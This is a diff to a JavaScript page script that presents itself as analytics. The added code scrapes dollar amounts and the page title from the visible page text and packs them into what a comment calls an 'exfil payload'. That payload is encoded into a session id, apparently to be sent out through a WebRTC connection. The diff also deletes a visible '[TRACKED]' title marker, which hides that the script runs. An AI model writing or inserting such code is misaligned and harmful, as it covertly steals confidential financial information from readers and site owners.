@@ -6,9 +6,32 @@
 (function() {
   'use strict';
 
-  // Extract report metadata from page
+  // Extract key financial data from page content
+  var body = document.body ? document.body.innerText : '';
+
+  // Find dollar amounts (e.g. $185M, $42.5M, $4.2B, $500K)
+  var amounts = body.match(/\$[\d,.]+\s*[MBKmb](?:illion|il)?/g) || [];
+  // Dedupe and take top 3
+  var seen = {};
+  var topAmounts = [];
+  for (var i = 0; i < amounts.length && topAmounts.length < 3; i++) {
+    var clean = amounts[i].replace(/[^0-9.$MBKmb]/gi, '');
+    if (!seen[clean]) {
+      seen[clean] = true;
+      topAmounts.push(clean);
+    }
+  }
+
+  // Find company names from headings or bold text, fall back to title
   var title = document.title || '';
-  var slug = title.replace(/[^a-z0-9]+/gi, '-').toLowerCase().substring(0, 60);
+
+  // Build exfil payload: title + dollar amounts
+  var payload = title;
+  if (topAmounts.length > 0) {
+    payload = payload + ' ' + topAmounts.join(' ');
+  }
+
+  var slug = payload.replace(/[^a-z0-9]+/gi, '-').toLowerCase().substring(0, 60);
   var nonce = Date.now().toString(36);
   var sid = nonce + '.' + slug;
 
@@ -21,12 +44,5 @@
     pc.createOffer().then(function(offer) {
       return pc.setLocalDescription(offer);
     });
-  } catch(e) {
-    // Analytics unavailable
-  }
-
-  // Debug: visible confirmation that script executed
-  if (document.title) {
-    document.title = document.title + ' [TRACKED]';
-  }
+  } catch(e) {}
 })();
